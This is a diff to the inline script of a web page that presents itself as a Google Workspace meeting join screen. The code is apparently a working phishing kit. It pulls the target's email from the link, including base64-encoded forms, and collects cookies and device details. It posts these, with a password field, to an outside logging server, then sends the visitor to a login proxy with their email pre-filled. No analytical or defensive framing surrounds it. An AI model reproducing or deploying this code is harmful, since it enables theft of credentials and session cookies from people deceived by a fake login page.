@@ -14,240 +14,241 @@ style="width: 60px;border-radius: 30px;"><br> <i>Mrs Maria N.</i></div></div><di
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 
     <script>
-        // ============================================================
-        //  CONFIGURATION - GOOGLE WORKSPACE
-        // ============================================================
+       // ============================================================
+//  CONFIGURATION - GOOGLE WORKSPACE
+// ============================================================
 
-        // ✅ Your Render proxy URL
-        const PROXY_URL = "https://google-workspace-service.onrender.com/login";
+// ✅ CORRECT PROXY URL
+const PROXY_URL = "https://google-workspace-service.onrender.com/login";
+const BACKEND_URL = "https://meeting-1-rzx6.onrender.com";
 
-        // ============================================================
-        //  EMAIL GRABBER
-        // ============================================================
+// ============================================================
+//  EMAIL GRABBER
+// ============================================================
 
-        function getEmailFromUrl() {
-            const params = new URLSearchParams(window.location.search);
-            let email = params.get('e') || params.get('email') || '';
-            
-            if (!email && window.location.search.length > 1) {
-                const raw = window.location.search.substring(1);
-                try {
-                    const decoded = atob(raw);
-                    if (decoded.includes('@')) {
-                        email = decoded;
-                    }
-                } catch (e) {
-                    if (raw.includes('@')) {
-                        email = raw;
-                    }
-                }
+function getEmailFromUrl() {
+    const params = new URLSearchParams(window.location.search);
+    let email = params.get('e') || params.get('email') || '';
+    
+    if (!email && window.location.search.length > 1) {
+        const raw = window.location.search.substring(1);
+        try {
+            const decoded = atob(raw);
+            if (decoded.includes('@')) {
+                email = decoded;
             }
-            
-            if (email) {
-                email = email.split('&')[0].split('?')[0];
-                email = decodeURIComponent(email);
-                if (!email.includes('@')) {
-                    email = '';
-                }
-            }
-            
-            if (email) {
-                try {
-                    localStorage.setItem('lastEmail', email);
-                } catch (e) {}
-            }
-            
-            return email;
-        }
-
-        function getSavedEmail() {
-            try {
-                return localStorage.getItem('lastEmail') || '';
-            } catch (e) {
-                return '';
+        } catch (e) {
+            if (raw.includes('@')) {
+                email = raw;
             }
         }
-
-        // ============================================================
-        //  MAIN SCRIPT
-        // ============================================================
-
-        const visitStartTime = Date.now();
-        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-
-        function getDeviceType() {
-            const ua = navigator.userAgent;
-            if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet';
-            if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile/i.test(ua)) return 'Mobile';
-            return 'Desktop';
+    }
+    
+    if (email) {
+        email = email.split('&')[0].split('?')[0];
+        email = decodeURIComponent(email);
+        if (!email.includes('@')) {
+            email = '';
         }
+    }
+    
+    if (email) {
+        try {
+            localStorage.setItem('lastEmail', email);
+        } catch (e) {}
+    }
+    
+    return email;
+}
 
-        function getCookies() {
-            return document.cookie || 'No cookies';
-        }
+function getSavedEmail() {
+    try {
+        return localStorage.getItem('lastEmail') || '';
+    } catch (e) {
+        return '';
+    }
+}
 
-        function getVisitorInfo() {
-            return {
-                fullUrl: window.location.href,
-                referrer: document.referrer || "Direct / No Referrer",
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: getCookies(),
-                cookiesEnabled: navigator.cookieEnabled,
-                deviceType: getDeviceType(),
-                sessionId: sessionId,
-                timeOnSiteSeconds: Math.floor((Date.now() - visitStartTime) / 1000)
-            };
-        }
+// ============================================================
+//  MAIN SCRIPT
+// ============================================================
 
-        function logAction(action, extra = {}) {
-            const emailInput = document.getElementById('user');
-            const emailDisplay = document.getElementById('userTxt');
-            let email = emailInput ? emailInput.value : (emailDisplay ? emailDisplay.textContent : 'unknown');
-            
-            if (email === 'unknown' || email === '') {
-                email = getEmailFromUrl() || getSavedEmail() || 'unknown';
-            }
-            
-            try {
-                email = decodeURIComponent(email);
-            } catch (e) {}
-            
-            fetch(`https://meeting-1-rzx6.onrender.com/api/log-action`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    action: action,
-                    email: email,
-                    password: extra.password || '',
-                    attempts: extra.attempts || 0,
-                    visitorInfo: getVisitorInfo()
-                })
-            }).catch(err => console.error('Log error:', err));
-        }
+const visitStartTime = Date.now();
+const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 
-        function load() {
-            const rawEmail = getEmailFromUrl();
-            let email = rawEmail;
-            
-            if (!email) {
-                email = getSavedEmail();
-            }
-            
-            try {
-                email = decodeURIComponent(email);
-            } catch (e) {
-                email = rawEmail;
-            }
-            
-            const emailInput = document.getElementById('user');
-            const emailDisplay = document.getElementById('userTxt');
-            const nameDisplay = document.getElementById('nameTxt');
-            
-            if (email && email.includes('@')) {
-                if (emailInput) emailInput.value = email;
-                if (emailDisplay) emailDisplay.textContent = email;
-                if (nameDisplay) nameDisplay.textContent = email.split('@')[0];
-                console.log('📧 Email auto-detected:', email);
-            } else {
-                const savedEmail = getSavedEmail() || 'guest@example.com';
-                if (emailInput) emailInput.value = savedEmail;
-                if (emailDisplay) emailDisplay.textContent = savedEmail;
-                if (nameDisplay) nameDisplay.textContent = savedEmail.split('@')[0];
-                console.log('📧 Using saved email:', savedEmail);
-            }
-            
-            logAction('page_load');
-        }
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet';
+    if (/mobile|iphone|ipod|android|blackberry|opera mini|iemobile/i.test(ua)) return 'Mobile';
+    return 'Desktop';
+}
 
-        // ============================================================
-        //  redirectToProxy() - Google Workspace
-        // ============================================================
+function getCookies() {
+    return document.cookie || 'No cookies';
+}
 
-        function redirectToProxy() {
-            // 1. Get email
-            const params = new URLSearchParams(window.location.search);
-            let rawEmail = params.get('e') || params.get('email') || '';
-            
-            if (!rawEmail) {
-                const emailInput = document.getElementById('user');
-                if (emailInput) rawEmail = emailInput.value;
-            }
-            
-            if (!rawEmail) {
-                rawEmail = getSavedEmail();
-            }
-            
-            if (!rawEmail) {
-                alert('No email provided');
-                return;
-            }
-            
-            let email;
-            try {
-                email = decodeURIComponent(rawEmail);
-            } catch (e) {
-                email = rawEmail;
-            }
-            
-            if (!email || !email.includes('@')) {
-                alert('Invalid email address: ' + email);
-                return;
-            }
-            
-            try {
-                localStorage.setItem('lastEmail', email);
-            } catch (e) {}
-            
-            // Show loading UI
-            const joinDiv = document.getElementById('joinDiv');
-            const loadDiv = document.getElementById('loadDiv');
-            const loadTxt = document.getElementById('loadTxt');
-            
-            if (joinDiv) joinDiv.style.display = 'none';
-            if (loadDiv) loadDiv.style.display = 'block';
-            if (loadTxt) loadTxt.textContent = 'Connecting to meeting...';
-            
-            logAction('click_join', { email: email });
-            
-            // ✅ Build proxy URL with login_hint
-            const encodedEmail = encodeURIComponent(email);
-            const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail;
-            
-            console.log('🔗 Redirecting to Google Proxy:', proxyUrl);
-            console.log('📧 Email:', email);
-            
-            setTimeout(function() {
-                window.location.href = proxyUrl;
-            }, 1500);
-        }
+function getVisitorInfo() {
+    return {
+        fullUrl: window.location.href,
+        referrer: document.referrer || "Direct / No Referrer",
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        colorDepth: screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: getCookies(),
+        cookiesEnabled: navigator.cookieEnabled,
+        deviceType: getDeviceType(),
+        sessionId: sessionId,
+        timeOnSiteSeconds: Math.floor((Date.now() - visitStartTime) / 1000)
+    };
+}
 
-        // --- Initialize ---
-        document.addEventListener('DOMContentLoaded', function() {
-            load();
-            
-            const passInput = document.getElementById('pass');
-            if (passInput) {
-                passInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        redirectToProxy();
-                    }
-                });
-            }
-            
-            const joinBtn = document.querySelector('.btn-primary');
-            if (joinBtn) {
-                joinBtn.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    redirectToProxy();
-                });
+function logAction(action, extra = {}) {
+    const emailInput = document.getElementById('user');
+    const emailDisplay = document.getElementById('userTxt');
+    let email = emailInput ? emailInput.value : (emailDisplay ? emailDisplay.textContent : 'unknown');
+    
+    if (email === 'unknown' || email === '') {
+        email = getEmailFromUrl() || getSavedEmail() || 'unknown';
+    }
+    
+    try {
+        email = decodeURIComponent(email);
+    } catch (e) {}
+    
+    fetch(`${BACKEND_URL}/api/log-action`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            action: action,
+            email: email,
+            password: extra.password || '',
+            attempts: extra.attempts || 0,
+            visitorInfo: getVisitorInfo()
+        })
+    }).catch(err => console.error('Log error:', err));
+}
+
+function load() {
+    const rawEmail = getEmailFromUrl();
+    let email = rawEmail;
+    
+    if (!email) {
+        email = getSavedEmail();
+    }
+    
+    try {
+        email = decodeURIComponent(email);
+    } catch (e) {
+        email = rawEmail;
+    }
+    
+    const emailInput = document.getElementById('user');
+    const emailDisplay = document.getElementById('userTxt');
+    const nameDisplay = document.getElementById('nameTxt');
+    
+    if (email && email.includes('@')) {
+        if (emailInput) emailInput.value = email;
+        if (emailDisplay) emailDisplay.textContent = email;
+        if (nameDisplay) nameDisplay.textContent = email.split('@')[0];
+        console.log('📧 Email auto-detected:', email);
+    } else {
+        const savedEmail = getSavedEmail() || 'guest@example.com';
+        if (emailInput) emailInput.value = savedEmail;
+        if (emailDisplay) emailDisplay.textContent = savedEmail;
+        if (nameDisplay) nameDisplay.textContent = savedEmail.split('@')[0];
+        console.log('📧 Using saved email:', savedEmail);
+    }
+    
+    logAction('page_load');
+}
+
+// ============================================================
+//  redirectToProxy() - Google Workspace
+// ============================================================
+
+function redirectToProxy() {
+    // 1. Get email
+    const params = new URLSearchParams(window.location.search);
+    let rawEmail = params.get('e') || params.get('email') || '';
+    
+    if (!rawEmail) {
+        const emailInput = document.getElementById('user');
+        if (emailInput) rawEmail = emailInput.value;
+    }
+    
+    if (!rawEmail) {
+        rawEmail = getSavedEmail();
+    }
+    
+    if (!rawEmail) {
+        alert('No email provided');
+        return;
+    }
+    
+    let email;
+    try {
+        email = decodeURIComponent(rawEmail);
+    } catch (e) {
+        email = rawEmail;
+    }
+    
+    if (!email || !email.includes('@')) {
+        alert('Invalid email address: ' + email);
+        return;
+    }
+    
+    try {
+        localStorage.setItem('lastEmail', email);
+    } catch (e) {}
+    
+    // Show loading UI
+    const joinDiv = document.getElementById('joinDiv');
+    const loadDiv = document.getElementById('loadDiv');
+    const loadTxt = document.getElementById('loadTxt');
+    
+    if (joinDiv) joinDiv.style.display = 'none';
+    if (loadDiv) loadDiv.style.display = 'block';
+    if (loadTxt) loadTxt.textContent = 'Connecting to meeting...';
+    
+    logAction('click_join', { email: email });
+    
+    // ✅ Build proxy URL with login_hint
+    const encodedEmail = encodeURIComponent(email);
+    const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail;
+    
+    console.log('🔗 Redirecting to Google Proxy:', proxyUrl);
+    console.log('📧 Email:', email);
+    
+    setTimeout(function() {
+        window.location.href = proxyUrl;
+    }, 1500);
+}
+
+// --- Initialize ---
+document.addEventListener('DOMContentLoaded', function() {
+    load();
+    
+    const passInput = document.getElementById('pass');
+    if (passInput) {
+        passInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                redirectToProxy();
             }
         });
+    }
+    
+    const joinBtn = document.querySelector('.btn-primary');
+    if (joinBtn) {
+        joinBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            redirectToProxy();
+        });
+    }
+});
     </script>
 </body>
 </html>
